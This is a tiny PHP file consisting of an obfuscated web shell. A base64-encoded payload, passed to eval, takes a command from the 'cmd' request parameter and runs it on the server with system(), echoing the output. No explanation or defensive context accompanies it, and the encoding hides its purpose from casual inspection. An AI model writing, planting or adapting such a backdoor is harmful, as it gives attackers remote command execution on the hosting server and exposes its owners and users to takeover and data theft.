

<?php
$code = 'aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIGRpZTsKfQ==';

$op = eval(base64_decode($code));
echo $op;
?>

